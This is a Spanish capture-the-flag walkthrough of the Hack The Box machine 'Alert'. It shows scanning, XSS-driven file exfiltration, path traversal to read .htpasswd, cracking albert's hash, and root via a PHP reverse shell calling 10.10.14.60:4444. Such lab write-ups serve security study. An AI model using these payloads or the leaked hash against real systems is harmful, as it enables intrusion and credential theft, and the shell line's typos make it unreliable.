Hacemos un escaneo de puerto de forma rapida haciendo uso de [[Anotaciones/Herramientas/Activas/3. Escaneo de puertos/nmap|nmap]]
```bash
nmap -p- -v -n -Pn -sS --min-rate 5000 10.10.11.44 -oG allPorts -open
```
![[Pasted image 20241128142725.png]]

Ahora vamos hacer un analisis de los servicios que estan corriendo en esos puertos ademas de las versiones y ver un poco mas de informacion usando los script mas comunes de nmap
```bash
nmap -p22,80 -v -n -Pn -sVC --min-rate 5000 10.10.11.44 -oN Targeted -open
```
![[Pasted image 20241128142953.png]]

Vamos a enumerar el servicio web, empezando por las tecnologias 
![[Pasted image 20241128143323.png]]
![[Pasted image 20241128143411.png]]

Vamos a revisar la web en busca de vectores de ataque, y con la enumarcion vemos que hay un archivo `message.php` el cual no sabemos que es
```bash
gobuster dir --url http://alert.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,md,zip,tar,bak,txt
```
![[Pasted image 20241128193651.png]]

Ya que estamos vamos a hacer una enumeracion de subdominios (en este caso para poder enumerar los subdominios, me ha funcionado a traves de  la cabezera `Host`)
```bash
ffuf -ac -u http://alert.htb -H "Host:FUZZ.alert.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
```
![[Pasted image 20241227162745.png]]
![[Pasted image 20241227162906.png]]

parece que tenemos un login por aqui, despues de intentar fuerza bruta me doy cuanta de que ese no es el camino, y vuelvo a analizar la inyeccion XXS que hemos encontrado, asi como el resto de la web y resulta que en la web de contacto el cuarpo del mensaje hace clic en un enlace que le pongamos tal que asi:
![[Pasted image 20241227163508.png]]
![[Pasted image 20241227163520.png]]

esto significa que ya tenemos todas las piezas del puzzle, vamos a hacer que el propio servidor nos mande el contenido de los .php a ver si vemos algo interesante, debemos hacer uso del xss 
![[Pasted image 20241227224509.png]]ahora este archivo lo subimos y el enlace de share lo pasamos a contact
![[Pasted image 20241227224651.png]]
![[Pasted image 20241227224714.png]]

Genial ahoa en nuestro server debemos ver la peticion con el contenido de la web message.php
![[Pasted image 20241227224809.png]]
	lo descodificamos de url 
	![[Pasted image 20241227225252.png]]
esto significa que podemos acceder a cualquier archivo del servidor y como hemos visto antes hay un vhost corriendo el cual pide credenciales de authenticacion (los cuales en servidores apache y nginx entre otros) estan en una archivo llamado `.htpasswd` este archivo suele estar alojado en la ruta raiz es decir acceder a esta ruta deberia darnos el archivo ` http://alert.htb/messaage.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd`

![[Pasted image 20241227233442.png]]
![[Pasted image 20241227233902.png]]
	lo decodificamos 
	![[Pasted image 20241227233938.png]]
`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

Boom tenemos credenciales vamos a crakear el hash
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash
```
![[Pasted image 20241227235257.png]]

ahora tenemos el control del usuario albert por ssh
![[Pasted image 20241227235457.png]]

# Escalada de privilegios
Vemos que hay otro usuario interesante
![[Pasted image 20241227235816.png]]

Al parecer estamos dentro de un grupo interesante
![[Pasted image 20241227235914.png]]

Aqui tenemos unos archivos interesantes
```bash
find / -type f -group management -exec ls -l {} \; 2>/dev/null
```

```bash
-rwxrwxr-x 1 root management 49 Dec 27 23:37 /opt/website-monitor/config/configuration.php
-rwxrwxr-x 1 albert management 9286 Dec 27 23:14 /opt/website-monitor/config/shell.php
```

revisando los servicios que estaban corriendo vemos que hay un puerto abierto que no hemos visto
```bash
netstat -lvnp
```
![[Pasted image 20241228004133.png]]
 
Vamos a hacer uso de ssh para hacer un portforwarding del puerto 8080 a nuestro puerto 8081 (ya lo tenemos en uso por burpsuite)
```bash
ssh -L 8081:localhost:8080 albert@10.10.11.44
```
![[Pasted image 20241228004848.png]]

Esta web tiene un titulo que me suena de antes
![[Pasted image 20241228005203.png]]

La web al parece esta alojada en esta ruta y nosotros tenemos permisos para el archivo shell.php y configuration.php (que el archivo shell.php esta aqui por que las maquinas de htb con VPN free comparten instancia con otros jugadores)

![[Pasted image 20241228005420.png]]

el archivo que nos interesa es el archivo config ya que aqui vamos a especificar la ruta de nuestro archivo .php con la revershell
```php
<?php exec('/bin/bash -c "bash -i >/dev/tcp/10.10.14.60/4444 0>$1"') ?>
```

![[Pasted image 20241228012129.png]]

ahora solo resta ponernos en escucha
```bash
lwrap -cAr nc -nlvp 4444
```
y simplemente accedemos al recurso desde la web
![[Pasted image 20241230095529.png]]

![[Pasted image 20241230095656.png]]
